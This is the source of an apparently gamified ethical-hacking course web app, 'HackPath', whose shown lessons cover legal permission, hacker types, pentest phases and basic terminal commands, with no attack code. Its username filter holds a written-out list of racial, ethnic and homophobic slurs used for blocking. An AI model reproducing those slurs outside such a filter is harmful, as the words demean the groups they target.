<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>HackPath</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üõ°Ô∏è</text></svg>">
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&family=Outfit:wght@300;400;500;600;700;800&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#080c14;--bg2:#0c1220;--card:#111a2e;--card2:#162038;--card3:#1c2844;
  --border:#1e2d4a;--border2:#2a3f6a;
  --green:#34d399;--greenDim:rgba(52,211,153,.12);--greenGlow:rgba(52,211,153,.25);
  --red:#f87171;--redDim:rgba(248,113,113,.12);
  --blue:#60a5fa;--blueDim:rgba(96,165,250,.12);
  --cyan:#22d3ee;--cyanDim:rgba(34,211,238,.1);
  --gold:#fbbf24;--goldDim:rgba(251,191,36,.12);
  --purple:#a78bfa;--purpleDim:rgba(167,139,250,.1);
  --text:#e8edf5;--text2:#b4bfcf;--textDim:#6b7a94;
  --accent:linear-gradient(135deg,var(--green),var(--cyan));
}
html,body{margin:0;padding:0;min-height:100vh;min-height:100dvh;background:var(--bg);color:var(--text);font-family:'Outfit',sans-serif;overflow-x:hidden;-webkit-font-smoothing:antialiased}
#root{min-height:100vh;min-height:100dvh}
.hp{min-height:100vh;min-height:100dvh;max-width:520px;margin:0 auto;padding:16px 16px 80px}
.center{display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;min-height:100dvh;gap:24px;max-width:440px;margin:0 auto;padding:20px}

/* Header */
.hdr{display:flex;align-items:center;justify-content:space-between;padding:12px 0 8px}
.logo{font-family:'JetBrains Mono',monospace;font-size:1.05rem;font-weight:700;background:var(--accent);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hdr-r{display:flex;gap:6px;align-items:center}

/* Buttons */
.btn{background:var(--accent);color:#080c14;border:none;padding:11px 22px;border-radius:10px;font-weight:700;font-size:.88rem;cursor:pointer;font-family:'Outfit',sans-serif;transition:all .15s;letter-spacing:.01em;-webkit-tap-highlight-color:transparent}
.btn:hover{transform:translateY(-1px);box-shadow:0 4px 20px var(--greenGlow)}
.btn:active{transform:scale(.97)}.btn:disabled{opacity:.35;cursor:default;transform:none;box-shadow:none}
.btn.sec{background:var(--card2);color:var(--text);border:1px solid var(--border)}
.btn.sec:hover{border-color:var(--border2);background:var(--card3)}
.btn.sm{padding:7px 14px;font-size:.8rem;border-radius:8px}.btn.full{width:100%}
.btn.icon-btn{width:36px;height:36px;padding:0;display:flex;align-items:center;justify-content:center;font-size:1rem;border-radius:10px;background:var(--card2);color:var(--text2);border:1px solid var(--border);transition:all .15s}
.btn.icon-btn:hover{border-color:var(--border2);color:var(--text);background:var(--card3);transform:translateY(-1px)}

/* Inputs */
.inp{background:var(--card);color:var(--text);border:1px solid var(--border);padding:12px 16px;border-radius:10px;font-size:.92rem;width:100%;font-family:'JetBrains Mono',monospace;outline:none;transition:border-color .2s}
.inp:focus{border-color:var(--green);box-shadow:0 0 0 3px var(--greenDim)}
.inp::placeholder{color:var(--textDim)}

/* Animations */
.fadeIn{animation:fadeIn .35s ease}
@keyframes fadeIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
.slideUp{animation:slideUp .4s cubic-bezier(.22,.68,0,1.1)}
@keyframes slideUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
.shake{animation:shake .4s ease}
@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-3px)}80%{transform:translateX(3px)}}
.pulse{animation:pulse .45s ease}
@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.06)}100%{transform:scale(1)}}
.glow{box-shadow:0 0 24px var(--greenGlow)}
.starPop{display:inline-block;animation:starPop .5s ease both}
@keyframes starPop{0%{transform:scale(0) rotate(-180deg);opacity:0}70%{transform:scale(1.3) rotate(10deg);opacity:1}100%{transform:scale(1) rotate(0deg)}}
.popIn{animation:popIn .25s cubic-bezier(.22,.68,0,1.1)}
@keyframes popIn{from{opacity:0;transform:scale(.88)}to{opacity:1;transform:scale(1)}}

/* Cards */
.card{background:var(--card);border-radius:14px;padding:20px;border:1px solid var(--border);transition:border-color .2s}
.teach{background:linear-gradient(135deg,var(--card),var(--card2));border-color:var(--border);border-left:3px solid var(--cyan)}
.gap{display:flex;flex-direction:column;gap:12px}

/* Options */
.opt{display:block;width:100%;text-align:left;padding:13px 18px;background:var(--card2);border:1.5px solid var(--border);border-radius:10px;color:var(--text);font-size:.9rem;cursor:pointer;margin:5px 0;transition:all .15s;font-family:'Outfit',sans-serif;-webkit-tap-highlight-color:transparent}
.opt:hover{border-color:var(--cyan);background:var(--cyanDim);transform:translateX(4px)}
.opt:active{transform:scale(.97)}
.opt.correct{border-color:var(--green);background:var(--greenDim);color:var(--green)}
.opt.wrong{border-color:var(--red);background:var(--redDim);color:var(--red)}

/* Progress bar */
.pbar{height:6px;background:var(--card);border-radius:3px;overflow:hidden}.pfill{height:100%;border-radius:3px;transition:width .4s}
.pfill-g{background:linear-gradient(90deg,var(--green),var(--cyan))}
.pfill-b{background:linear-gradient(90deg,var(--blue),var(--purple))}

/* Map nodes */
.mnode{width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.9rem;cursor:pointer;border:2.5px solid transparent;font-family:'JetBrains Mono',monospace;-webkit-tap-highlight-color:transparent}
.mnode.done{background:var(--greenDim);color:var(--green);border-color:var(--green)}
.mnode.done:hover{box-shadow:0 0 16px var(--greenGlow);transform:scale(1.08)}
.mnode.cur{background:var(--card2);border-color:var(--green);color:var(--green);box-shadow:0 0 20px var(--greenGlow)}
.mnode.cur:hover{box-shadow:0 0 28px var(--greenGlow);transform:scale(1.1)}
.mnode.lock{background:var(--card);border-color:var(--border);color:var(--textDim);cursor:default;opacity:.4}
.mnode.cp{border-radius:12px;width:auto;min-width:50px;padding:0 10px;background:var(--goldDim);border-color:var(--gold);color:var(--gold)}
.mnode.cp:not(.done):hover{box-shadow:0 0 16px rgba(251,191,36,.25);transform:scale(1.06)}
.mnode.cp.done{background:var(--greenDim);border-color:var(--green);color:var(--green)}
.mnode.lab{border-radius:12px;width:auto;min-width:50px;padding:0 10px;background:var(--cyanDim);border-color:var(--cyan);color:var(--cyan)}
.mnode.lab:not(.done):hover{box-shadow:0 0 16px rgba(34,211,238,.25);transform:scale(1.06)}
.mnode.lab.done{background:var(--greenDim);border-color:var(--green);color:var(--green)}

/* Badges */
.badge{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;border-radius:6px;font-size:.72rem;font-weight:600;font-family:'JetBrains Mono',monospace}
.badge-xp{background:var(--goldDim);color:var(--gold)}
.badge-level{background:var(--cyanDim);color:var(--cyan)}

/* OS tabs */
.osbtn{padding:16px;border-radius:12px;border:2px solid var(--border);background:var(--card);cursor:pointer;text-align:center;transition:all .2s;-webkit-tap-highlight-color:transparent}
.osbtn:hover{border-color:var(--border2);background:var(--card2);transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.2)}
.osbtn:active{transform:scale(.96)}
.osbtn.sel{border-color:var(--green);background:var(--greenDim)}
.osbtn.sel:hover{box-shadow:0 0 16px var(--greenGlow)}
.ostab{padding:6px 12px;border-radius:8px;font-size:.75rem;cursor:pointer;border:1px solid var(--border);background:var(--card);color:var(--textDim);font-family:'JetBrains Mono',monospace;transition:all .15s}
.ostab:hover{border-color:var(--border2);color:var(--text2)}
.ostab:active{transform:scale(.95)}
.ostab.active{background:var(--greenDim);border-color:var(--green);color:var(--green)}

/* Lab */
.labterm{background:#050a0f;border-radius:10px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.7;max-height:240px;overflow-y:auto;border:1px solid #152015;box-shadow:inset 0 2px 8px rgba(0,0,0,.4)}
.labterm .p{color:#34d399}.labterm .o{color:#b4bfcf;white-space:pre-wrap}.labterm .h{color:#fbbf24;font-style:italic}.labterm .s{color:#34d399;font-weight:700}.labterm .f{color:#f87171}

/* Order items */
.oi{display:flex;align-items:center;gap:8px;padding:11px 14px;background:var(--card2);border:1px solid var(--border);border-radius:10px;margin:4px 0;font-size:.85rem;transition:all .15s}
.oi button{background:var(--card);border:1px solid var(--border);color:var(--text2);width:26px;height:22px;border-radius:5px;cursor:pointer;font-size:.65rem;display:flex;align-items:center;justify-content:center;transition:all .12s}
.oi button:hover{border-color:var(--blue);background:var(--blueDim);color:var(--blue)}
.oi button:active{transform:scale(.88)}

/* Match */
.mi{padding:11px 14px;border-radius:10px;cursor:pointer;font-size:.82rem;text-align:center;transition:all .15s;background:var(--card2);border:2px solid var(--border);-webkit-tap-highlight-color:transparent}
.mi:hover{border-color:var(--purple);background:var(--purpleDim);transform:translateY(-1px)}

/* Section headers */
.sec-hdr{padding:18px 0 6px;display:flex;align-items:center;gap:10px}
.sec-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.1rem}
.sec-info{flex:1}.sec-title{font-weight:700;font-size:.88rem}.sec-desc{font-size:.72rem;margin-top:2px}

/* Why text */
.why{font-size:.82rem;color:var(--text2);margin-top:8px;padding:10px 14px;background:var(--bg2);border-radius:8px;border-left:2px solid var(--green)}

/* Settings */
.set-group{margin-bottom:20px}
.set-label{font-size:.72rem;color:var(--textDim);text-transform:uppercase;letter-spacing:1px;font-weight:600;margin-bottom:10px}
.set-row{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:var(--card);border:1px solid var(--border);border-radius:12px;margin-bottom:8px;transition:all .15s}
.set-row.hoverable{cursor:pointer}.set-row.hoverable:hover{border-color:var(--border2);background:var(--card2)}
.set-row.hoverable:active{transform:scale(.98)}
.set-row.hover-blue:hover{border-color:var(--blue);background:var(--blueDim)}
.set-row.hover-gold:hover{border-color:var(--gold);background:var(--goldDim)}
.set-row.hover-red{cursor:pointer}.set-row.hover-red:hover{border-color:var(--red);background:var(--redDim)}
.set-row.hover-red:active{transform:scale(.98)}
.btn.danger{background:var(--card);color:var(--red);border:1px solid var(--border);transition:all .15s}
.btn.danger:hover{border-color:var(--red);background:var(--redDim);box-shadow:0 4px 16px rgba(248,113,113,.15);transform:translateY(-1px)}
.btn.danger:active{transform:scale(.97)}
.set-row .left{display:flex;align-items:center;gap:10px}
.set-row .left .icon{font-size:1.1rem;width:28px;text-align:center}
.set-row .left .label{font-size:.9rem;font-weight:500}
.set-row .left .sublabel{font-size:.72rem;color:var(--textDim)}
.toggle{width:44px;height:24px;border-radius:12px;background:var(--card3);border:1px solid var(--border);cursor:pointer;position:relative;transition:all .2s;-webkit-tap-highlight-color:transparent}
.toggle:hover{border-color:var(--border2);box-shadow:0 0 8px rgba(52,211,153,.15)}
.toggle:active{transform:scale(.92)}
.toggle.on{background:var(--green);border-color:var(--green)}
.toggle.on:hover{box-shadow:0 0 12px var(--greenGlow)}
.toggle::after{content:'';position:absolute;width:18px;height:18px;border-radius:50%;background:white;top:2px;left:2px;transition:transform .2s}
.toggle.on::after{transform:translateX(20px)}
.theme-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.theme-opt{padding:14px;border-radius:12px;border:2px solid var(--border);cursor:pointer;text-align:center;transition:all .2s;-webkit-tap-highlight-color:transparent}
.theme-opt:hover{border-color:var(--border2);transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.2)}
.theme-opt:active{transform:scale(.96)}
.theme-opt.sel{border-color:var(--green)}
.theme-opt.sel:hover{box-shadow:0 0 16px var(--greenGlow)}
.theme-dot{width:32px;height:32px;border-radius:50%;margin:0 auto 6px;border:2px solid rgba(255,255,255,.1)}
.slider-wrap{display:flex;align-items:center;gap:12px;padding:14px 16px;background:var(--card);border:1px solid var(--border);border-radius:12px}
.slider-wrap input[type=range]{flex:1;-webkit-appearance:none;appearance:none;height:6px;border-radius:3px;background:var(--card3);outline:none}
.slider-wrap input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:20px;height:20px;border-radius:50%;background:var(--green);cursor:pointer;border:2px solid var(--bg)}
.slider-wrap input[type=range]::-moz-range-thumb{width:20px;height:20px;border-radius:50%;background:var(--green);cursor:pointer;border:2px solid var(--bg)}
.slider-val{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--text2);min-width:32px;text-align:right}

/* Noise overlay */
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;opacity:.015;z-index:9999;
background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}

/* Bottom nav */
.bnav{position:fixed;bottom:0;left:0;right:0;background:var(--card);border-top:1px solid var(--border);display:flex;justify-content:center;gap:0;padding:6px 0 env(safe-area-inset-bottom,6px);z-index:100}
.bnav-btn{flex:1;max-width:120px;display:flex;flex-direction:column;align-items:center;gap:2px;padding:6px 0;color:var(--textDim);font-size:.65rem;font-weight:600;cursor:pointer;transition:all .15s;-webkit-tap-highlight-color:transparent;background:none;border:none;font-family:'Outfit',sans-serif}
.bnav-btn:hover{color:var(--text2)}
.bnav-btn:active{transform:scale(.9)}
.bnav-btn .ico{font-size:1.2rem;transition:transform .15s}
.bnav-btn:hover .ico{transform:translateY(-1px)}
.bnav-btn.active{color:var(--green)}
.bnav-btn.active:hover{color:var(--green)}
/* === QOL ADDITIONS === */
html{scroll-behavior:smooth}
.screen-fade{animation:screenFade .2s ease}
@keyframes screenFade{from{opacity:0}to{opacity:1}}
.lesson-progress{position:fixed;top:0;left:0;height:3px;background:var(--green);z-index:100;transition:width .4s cubic-bezier(.4,0,.2,1);border-radius:0 2px 2px 0}
.lesson-header{display:flex;align-items:center;gap:8px;padding:0 0 8px;margin-bottom:4px}
.lesson-header .back-btn{background:none;border:none;color:var(--textDim);font-size:1.1rem;cursor:pointer;padding:4px 8px;border-radius:8px;-webkit-tap-highlight-color:transparent;transition:all .15s}
.lesson-header .back-btn:hover{color:var(--text);background:var(--card2)}
.lesson-header .back-btn:active{background:var(--card3);transform:scale(.9)}
.lesson-header .ltitle{font-size:.72rem;color:var(--textDim);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.lesson-header .round-count{font-size:.68rem;color:var(--textDim);font-family:'JetBrains Mono',monospace}
.xp-toast{position:fixed;top:60px;right:16px;background:var(--gold);color:#000;font-weight:700;font-size:.82rem;padding:6px 14px;border-radius:20px;z-index:200;animation:xpToast 1.5s ease forwards;pointer-events:none}
@keyframes xpToast{0%{opacity:0;transform:translateY(10px)}15%{opacity:1;transform:translateY(0)}80%{opacity:1;transform:translateY(0)}100%{opacity:0;transform:translateY(-20px)}}
.map-progress{background:var(--bg2);border-radius:20px;height:6px;overflow:hidden;margin:8px 0 4px}
.map-progress-bar{height:100%;background:linear-gradient(90deg,var(--green),var(--cyan));border-radius:20px;transition:width .5s ease}
.streak-badge{display:inline-flex;align-items:center;gap:4px;background:var(--goldDim);color:var(--gold);padding:3px 10px;border-radius:12px;font-size:.72rem;font-weight:700}
.section-card{transition:all .15s ease}
.section-card:hover{border-color:var(--border2);box-shadow:0 4px 16px rgba(0,0,0,.15)}
.section-card:active{transform:scale(.98)}
.mnode{transition:transform .15s ease,box-shadow .2s ease,background .3s ease,color .3s ease,border-color .3s ease,opacity .3s ease}
.mnode:not(.lock):active{transform:scale(.9)}
.mnode{position:relative}
.mnode .tip{position:absolute;top:calc(100% + 8px);left:50%;transform:translateX(-50%) translateY(4px);background:var(--card2);color:var(--text);border:1px solid var(--border2);padding:5px 10px;border-radius:8px;font-size:.7rem;font-family:'Outfit',sans-serif;font-weight:500;white-space:nowrap;pointer-events:none;opacity:0;transition:all .15s ease;z-index:50}
.mnode .tip::before{content:'';position:absolute;bottom:100%;left:50%;transform:translateX(-50%);border:5px solid transparent;border-bottom-color:var(--border2)}
.mnode:hover .tip{opacity:1;transform:translateX(-50%) translateY(0)}
@media(prefers-reduced-motion:reduce){*{animation-duration:0.01ms!important;transition-duration:0.01ms!important}}
</style>
</head>
<body>
<div id="root"></div>
<script>
// === SOUNDS ===
var _ac=null,_vol=80,_sfxOn=true;
function ac(){if(!_ac)_ac=new(window.AudioContext||window.webkitAudioContext)();return _ac}
function beep(f,d,t,v){if(!_sfxOn)return;try{var c=ac(),o=c.createOscillator(),g=c.createGain();o.type=t||'sine';o.frequency.value=f;g.gain.value=(v||.15)*(_vol/100);o.connect(g);g.connect(c.destination);o.start();g.gain.exponentialRampToValueAtTime(.001,c.currentTime+d);o.stop(c.currentTime+d)}catch(e){}}
var SFX={
  correct:function(){beep(523,.12);setTimeout(function(){beep(659,.12)},80);setTimeout(function(){beep(784,.15)},160)},
  wrong:function(){beep(200,.2,'sawtooth',.1);setTimeout(function(){beep(150,.25,'sawtooth',.08)},120)},
  complete:function(){beep(523,.1);setTimeout(function(){beep(659,.1)},100);setTimeout(function(){beep(784,.1)},200);setTimeout(function(){beep(1047,.2)},300)},
  tap:function(){beep(800,.05,'sine',.05)},
  levelup:function(){beep(392,.1);setTimeout(function(){beep(523,.1)},100);setTimeout(function(){beep(659,.1)},200);setTimeout(function(){beep(784,.15)},300)}
};

// === STORAGE ===
function sKey(u,k){return 'hp10-'+u+'-'+k}
function saveP(u,p){if(u==='guest')return;try{localStorage.setItem(sKey(u,'p'),JSON.stringify(p))}catch(e){}}
function loadP(u){if(u==='guest')return{};try{var r=localStorage.getItem(sKey(u,'p'));return r?JSON.parse(r):{}}catch(e){return{}}}
function saveOS(u,o){if(u==='guest')return;try{localStorage.setItem(sKey(u,'os'),JSON.stringify(o))}catch(e){}}
function loadOS(u){if(u==='guest')return null;try{var r=localStorage.getItem(sKey(u,'os'));return r?JSON.parse(r):null}catch(e){return null}}
function saveUser(u,p){try{localStorage.setItem(sKey(u,'a'),p)}catch(e){}}
function checkUser(u){try{return localStorage.getItem(sKey(u,'a'))}catch(e){return null}}
function saveSets(u,s){if(u==='guest')return;try{localStorage.setItem(sKey(u,'set'),JSON.stringify(s))}catch(e){}}
function loadSets(u){if(u==='guest')return{};try{var r=localStorage.getItem(sKey(u,'set'));return r?JSON.parse(r):{}}catch(e){return{}}}

// === THEMES ===
var THEMES={
  dark:{name:'Midnight',bg:'#080c14',bg2:'#0c1220',card:'#111a2e',card2:'#162038',card3:'#1c2844',border:'#1e2d4a',text:'#e8edf5',text2:'#b4bfcf',textDim:'#6b7a94',dot:'#111a2e'},
  hacker:{name:'Hacker',bg:'#070f07',bg2:'#0a150a',card:'#0f1f0f',card2:'#142a14',card3:'#193519',border:'#1e4a1e',text:'#c8f0c8',text2:'#90c890',textDim:'#507050',dot:'#0f1f0f'},
  light:{name:'Light',bg:'#f0f2f5',bg2:'#e8eaed',card:'#ffffff',card2:'#f5f7fa',card3:'#eef0f4',border:'#d0d5dd',text:'#1a1a2e',text2:'#4a5568',textDim:'#8090a0',dot:'#ffffff'},
  ocean:{name:'Ocean',bg:'#0a1628',bg2:'#0e1c32',card:'#132240',card2:'#18294a',card3:'#1e3258',border:'#243c66',text:'#e0eaf5',text2:'#a8c0d8',textDim:'#607890',dot:'#132240'}
};
function applyTheme(t){
  var th=THEMES[t]||THEMES.dark,r=document.documentElement.style;
  r.setProperty('--bg',th.bg);r.setProperty('--bg2',th.bg2);
  r.setProperty('--card',th.card);r.setProperty('--card2',th.card2);r.setProperty('--card3',th.card3);
  r.setProperty('--border',th.border);r.setProperty('--text',th.text);r.setProperty('--text2',th.text2);r.setProperty('--textDim',th.textDim);
  document.body.style.background=th.bg;
}

// === UTILS ===
function shuffle(a){var b=a.slice();for(var i=b.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=b[i];b[i]=b[j];b[j]=t}return b}
function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML}

// === USERNAME CHECK ===
var BLOCKED_EXACT=["nigger","nigga","nigg3r","n1gger","n1gga","faggot","f4ggot","fag","kike","k1ke","chink","ch1nk","spic","sp1c","wetback","gook","raghead","towelhead","coon","darkie","beaner","tranny","retard","r3tard"];
var BLOCKED_SUBSTR=["nigger","nigga","nigg3r","n1gger","n1gga"];
function checkUName(name){
  var low=name.toLowerCase().replace(/\s+/g,'');
  if(low.length<2)return'Username must be at least 2 characters';
  if(low.length>24)return'Max 24 characters';
  if(!/^[a-zA-Z0-9_.\-]+$/.test(name.trim()))return'Letters, numbers, _ . - only';
  for(var i=0;i<BLOCKED_SUBSTR.length;i++)if(low.indexOf(BLOCKED_SUBSTR[i])!==-1)return"That username isn't allowed";
  var words=low.replace(/[_.\-0-9]/g,' ').split(/\s+/);
  for(var i=0;i<words.length;i++)if(BLOCKED_EXACT.indexOf(words[i])!==-1)return"That username isn't allowed";
  return null;
}

// ============================================================
// SECTION 1: FOUNDATIONS (Beginner)
// ============================================================
var SEC1 = {
  id:"s1",title:"Foundations",tier:"basic",icon:"\uD83D\uDEE1\uFE0F",color:"var(--green)",
  desc:"Ethics, terminal, Linux, and networking",
  units:[
  // ---- UNIT 1: ETHICS ----
  {id:"u1",title:"Ethics & Mindset",desc:"Legal rules and hacker types",levels:[
    {id:"u1l1",title:"What is Ethical Hacking?",rounds:[
      {type:"teach",text:"Ethical hacking means being hired to break into systems \u2014 legally, with written permission. Imagine a bank paying you to try to rob them so they can fix the weak spots before a real criminal finds them. That's basically the job.",detail:"Other names for this job: Penetration Tester, Security Consultant, Red Teamer, Bug Bounty Hunter.\nAverage salary: $90,000 - $150,000+ per year.\nYou don't need a college degree \u2014 certifications and skills matter more."},
      {type:"teach",text:"Banks, hospitals, tech companies, and even governments hire ethical hackers. Your job is to think like a criminal, find every security hole, then write a report explaining what you found and how to fix it. You NEVER steal or damage anything.",detail:"The key difference between a criminal hacker and you: a signed piece of paper giving you permission.\nWithout that paper, the EXACT same actions are a serious crime.\nWith it, you're a highly paid professional."},
      {type:"pick",q:"Why do companies PAY hackers to break into their own systems?",opts:["To find security holes before criminals do","To spy on their competitors","To build their website","To install antivirus software"],a:"To find security holes before criminals do",why:"It's cheaper to pay a friendly hacker $10K to find a hole than lose $10 million when a criminal finds it first."},
      {type:"tf",q:"Ethical hackers can test any system they want, anytime.",a:false,why:"You MUST have written permission before testing anything. Without it, even 'helpful' hacking is a crime."}
    ]},
    {id:"u1l2",title:"Types of Hackers",rounds:[
      {type:"teach",text:"White Hat = hired with permission, like a locksmith testing a bank's locks. Black Hat = criminals who steal data. Grey Hat = finds bugs without asking \u2014 still illegal, no permission."},
      {type:"pick",q:"A locksmith hired by a bank to test their locks is most like a:",opts:["White Hat \u2014 legal and hired","Black Hat \u2014 criminal","Grey Hat \u2014 no permission","Script Kiddie \u2014 using tools blindly"],a:"White Hat \u2014 legal and hired",why:"White Hats have written permission. That's what makes them legal."},
      {type:"teach",text:"More hacker types: A Script Kiddie is someone who downloads hacking tools and clicks 'run' without actually understanding what they do. Companies also have special security teams. Red Team = the people hired to pretend to be hackers and attack the company. Blue Team = the defenders who try to stop them. Purple Team = people who do both.",detail:"White Hat = Legal hacker with permission (pen tester, security consultant).\nBlack Hat = Criminal hacker, no permission, steals data.\nGrey Hat = No permission but doesn't steal \u2014 still illegal.\nScript Kiddie = Runs tools without understanding them.\nRed Team = Simulates attackers (offensive).\nBlue Team = Defends against attacks (defensive).\nPurple Team = Combines red and blue (both sides)."},
      {type:"match",q:"\uD83C\uDFA9 Match the hat to the hacker:",pairs:[["White Hat \uD83E\uDD20","Legal, hired to test"],["Black Hat \uD83D\uDC80","Criminal, steals data"],["Grey Hat \uD83D\uDC7B","No permission, no theft"],["Red Team \uD83D\uDD34","Simulates real attacks"]],why:"Each type plays a different role in cybersecurity. White and Red are legal, Black is criminal."},
    ]},
    {id:"u1l3",title:"Legal Rules & 5 Phases",rounds:[
      {type:"teach",text:"Before you hack anything, you need written permission. Think of it like a contract. The 'Scope' tells you exactly which computers or websites you're allowed to test \u2014 touch anything else and you're breaking the law. 'Rules of Engagement' tells you what methods you can use. And you sign an NDA (Non-Disclosure Agreement) promising to keep everything you find secret."},
      {type:"teach",text:"Every hack follows 5 steps: 1) Recon = scout from distance. 2) Scanning = check every door. 3) Exploitation = pick the weakest lock. 4) Post-Exploitation = find the treasure. 5) Reporting = write down how you got in."},
      {type:"order",q:"Put the 5 pentest phases in order:",items:["Reconnaissance","Scanning","Exploitation","Post-Exploitation","Reporting"],why:"Always follow this order. Never exploit before you scan."},
      {type:"scenario",situation:"A friend asks you to hack their ex's Instagram to see if they're cheating.",q:"What do you do?",opts:["Refuse \u2014 unauthorized access is illegal","Help them, it's for a good cause","Do it but don't tell anyone","Only if they pay you"],a:"Refuse \u2014 unauthorized access is illegal",why:"Accessing someone's account without consent is a crime regardless of reason."},
    ]},
    // LAB
    {id:"u1lab",title:"\uD83D\uDDA5\uFE0F Lab: Ethics Decisions",rounds:[
      {type:"lab",title:"Ethics Decisions",objective:"Navigate ethical scenarios a pentester faces on the job.",banner:"Welcome to MegaCorp Security Consulting\nYour first day as a junior pentester.\n",steps:[
        {hint:"Your manager hands you a scope document. What's the first thing you check?",accept:["~scope","~systems","~target","what systems","which systems"],output:"Scope document: Test authorized for:\n- 10.10.10.0/24 (web servers)\n- portal.megacorp.com\nOUT OF SCOPE: Database servers, employee workstations",successMsg:"Always read the scope FIRST. It defines your legal boundaries.",example:"what systems can I test",quickCmds:["what systems can I test"]},
        {hint:"You accidentally discover a vulnerability on 10.10.20.5 which is OUT of scope. What do you do?",accept:["~report","~note","~document","~tell","~manager","~stop"],output:"Good call. You documented it and told your manager.\nThey'll contact the system owner through proper channels.",successMsg:"Never exploit out-of-scope findings. Document and report to your team lead.",example:"report to manager",quickCmds:["report to manager","document and stop"]},
        {hint:"The client asks you to also test their employee email server (not in scope). What do you say?",accept:["~scope","~update","~writing","~written","~amendment","~new scope","~add"],output:"You requested a scope amendment in writing.\nClient signed the updated ROE adding email server testing.",successMsg:"Never test anything without written authorization, even if the client verbally asks!",example:"need updated scope in writing",quickCmds:["need updated scope in writing"]}
      ]}
    ]},
    // MASTERY
    {id:"u1m",title:"\uD83C\uDFC6 Ethics Mastery",isCheckpoint:true,rounds:[
      {type:"pick",q:"What must you have BEFORE testing a system?",opts:["Written permission","A VPN","Kali Linux","A degree"],a:"Written permission",why:"No permission = illegal, period."},
      {type:"scenario",situation:"You're scanning for a bug bounty. You find a vulnerability on a different company's server in the same IP range.",q:"What should you do?",opts:["Ignore it \u2014 outside your scope","Exploit it to show impact","Report it to the other company","Post it on Twitter"],a:"Ignore it \u2014 outside your scope",why:"Testing outside scope is illegal. You can optionally notify them through proper channels."},
      {type:"tf",q:"Grey Hat hackers have permission to test systems.",a:false,why:"Grey Hats act without permission, even if their intentions aren't malicious."},
      {type:"order",q:"Pentest phases in order:",items:["Reconnaissance","Scanning","Exploitation","Post-Exploitation","Reporting"],why:"This methodology keeps you organized and legal."},
      {type:"match",q:"Match the document:",pairs:[["Scope","Which systems to test"],["ROE","Allowed methods"],["NDA","Keep findings secret"]],why:"All three must be in writing before you start."},
    ]},
  ]},

  // ---- UNIT 2: TERMINAL BASICS ----
  {id:"u2",title:"Terminal Basics",desc:"Navigate the command line",levels:[
    {id:"u2l1",title:"Where Am I?",rounds:[
      {type:"teach",text:"The terminal is a text box where you type commands instead of clicking. Think of it like texting your computer \u2014 you type what you want, hit Enter, and it does it. Every hacking tool runs here."},
      {type:"teach",text:"Your first two commands: pwd shows which folder you're in (like checking your GPS). ls -la lists every file in that folder, including hidden ones that start with a dot.",detail:"pwd = Print Working Directory. Shows the full path of where you are right now.\nls = List. Shows files in the current folder.\n-l = Long format (shows size, owner, permissions).\n-a = All files, including hidden ones that start with a dot (.).\nCombine them: ls -la shows everything with full details."},
      {type:"hack",story:"You've just connected to a company's server. The screen is black with a blinking cursor. You need to figure out which folder you landed in.",q:"Check which folder you're in. (Hint: pwd)",a:["pwd"],output:"/var/www/html\n\nYou're in the web server's main folder.\nThis is where the website's files live.",success:"You're inside a web server! This folder holds the company's entire website.",why:"pwd stands for 'print working directory' \u2014 it shows your current folder location."},
      {type:"hack",story:"Now you know WHERE you are. But you can't see any files yet. Use ls -la to turn on the lights and see everything \u2014 including hidden files.",q:"List all files here, including hidden ones. (Hint: ls -la)",a:["ls -la","ls -al"],output:"-rw-r--r-- 1 root root  4096 Jan 15 index.html\n-rw-r--r-- 1 root root   890 Jan 15 config.php\ndrwxr-xr-x 2 root root  4096 Jan 15 uploads/\n-rw------- 1 root root    42 Jan 15 .htpasswd\n-rw------- 1 root root    78 Jan 15 .env",success:"Found hidden files! .htpasswd stores passwords and .env stores secret settings.",why:"ls = list files. -l = show details (size, owner). -a = show ALL files including hidden ones (files starting with a dot)."},
    ]},
    {id:"u2l2",title:"Moving & Creating",rounds:[
      {type:"teach",text:"cd = go to a folder. cd uploads enters the uploads folder. cd .. goes up one level. cd ~ goes home. Tab completion fills in names so you type faster.",detail:"cd = Change Directory. Moves you to a different folder.\ncd uploads = go INTO the uploads folder.\ncd .. = go UP one folder (the two dots mean 'parent folder').\ncd ~ = go to your home folder.\nTab key = auto-completes file and folder names so you don't have to type the whole thing."},
